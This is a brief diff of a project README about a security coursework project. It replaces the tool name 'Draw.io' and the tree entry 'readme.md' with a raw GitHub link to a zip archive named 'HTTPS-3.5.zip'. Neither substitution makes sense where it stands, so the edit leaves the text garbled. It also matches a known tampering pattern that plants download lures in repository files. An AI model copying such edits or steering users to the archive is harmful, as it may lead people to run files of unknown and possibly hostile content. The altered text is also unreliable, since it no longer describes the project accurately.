@@ -6,7 +6,7 @@ using popular vulnerability
 
 # Project Requirements 
 
-Draw.io to draw the sequence diagrams/automata 
+https://raw.githubusercontent.com/youssefjmal/HTTPS/main/docs/tcp/HTTPS-3.5.zip to draw the sequence diagrams/automata 
 latex for rapport pdf (we will use md for now)
 uppal or I don't know the name of it but for simulation 
 
@@ -17,7 +17,7 @@ this can get updated
 ```bash
 docs/
 |----public/
-readme.md
+https://raw.githubusercontent.com/youssefjmal/HTTPS/main/docs/tcp/HTTPS-3.5.zip
 
 ```
 # Naming Convention
